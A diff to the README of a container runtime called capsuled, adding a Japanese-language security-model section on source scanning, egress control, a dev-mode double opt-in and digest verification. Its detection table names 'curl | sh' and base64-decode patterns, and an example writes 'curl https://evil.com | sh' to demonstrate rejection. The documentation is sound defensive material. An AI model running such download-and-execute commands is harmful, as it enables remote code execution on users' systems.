@@ -131,16 +131,82 @@ Create `config.toml`:
 kind = "youki"  # or "docker", "source", "wasm"
 binary_path = "/usr/local/bin/youki"
 state_root = "/var/run/capsuled"
+# UARC V1.1.0: Dev mode flag (default: false)
+allow_insecure_dev_mode = false
 
 [security]
 allowed_host_paths = ["/tmp", "/data"]
 egress_proxy_port = 3128
-
-[storage]
-default_vg = "capsuled-vg"
 ```
 
 See [config.toml.example](config.toml.example) for full configuration options.
+
+## Security Model (UARC V1.1.0)
+
+capsuled は多層防御アーキテクチャを実装し、Verifiable Execution を保証します。
+
+### L1 Source Policy (ソースコード検証)
+
+ソースコードに含まれる危険なパターンを検出・拒否します：
+
+| パターン | 検出理由 |
+|----------|----------|
+| `curl \| sh`, `wget \| bash` | リモートコード注入 |
+| `eval`, `exec` | 動的コード実行 |
+| `base64 -d`, `base64 --decode` | 難読化されたペイロード |
+
+```bash
+# 例: 危険なコードを含むカプセルはデプロイが拒否される
+echo 'curl https://evil.com | sh' > malicious.sh
+capsule open --dev  # → L1 Policy Violation: Obfuscation detected
+```
+
+### L3 Pre-Execution Analysis
+
+実行時マニフェストの静的解析により、追加の危険パターンを検出します。
+
+### L4 Network Guard (Egress Policy)
+
+ネットワーク通信は `EgressPolicyRegistry` により制御されます：
+- カプセルごとにアイデンティティトークン (`UARC_IDENTITY_TOKEN`) を発行
+- マニフェストで指定された `egress_allow` ルールのみ許可
+- 未許可のアウトバウンド通信はプロキシでブロック
+
+### Dev Mode セキュリティ
+
+開発モードでのサンドボックス緩和には**二重許可 (AND ロジック)** が必要です：
+
+```
+effective_dev_mode = manifest.dev_mode AND engine.allow_insecure_dev_mode
+```
+
+| マニフェスト `dev_mode` | Engine `allow_insecure_dev_mode` | 結果 |
+|------------------------|----------------------------------|------|
+| `true` | `true` | ✅ サンドボックス緩和 |
+| `true` | `false` | ❌ サンドボックス維持 (警告出力) |
+| `false` | `true` | ❌ サンドボックス維持 |
+| `false` | `false` | ❌ サンドボックス維持 |
+
+### 環境変数
+
+| 変数名 | デフォルト | 説明 |
+|--------|-----------|------|
+| `CAPSULED_ALLOW_DEV_MODE` | `false` | `1` または `true` で開発モードを許可。**本番環境では絶対に設定しない** |
+| `UARC_IDENTITY_TOKEN` | (自動発行) | カプセルのアイデンティティトークン (ランタイムが自動設定) |
+
+```bash
+# 開発環境でのみ使用
+CAPSULED_ALLOW_DEV_MODE=1 capsule open --dev
+```
+
+### CAS-based Verification
+
+本番環境では、ソースコードは CAS (Content-Addressable Storage) から取得・検証されます：
+
+1. マニフェストに `source_digest` (SHA256) を記載
+2. Engine が CAS からソースをフェッチ
+3. ダイジェストを検証後、L1 Source Policy スキャンを実行
+4. 全て通過後にのみ実行を許可
 
 ## Runtime Selection
 
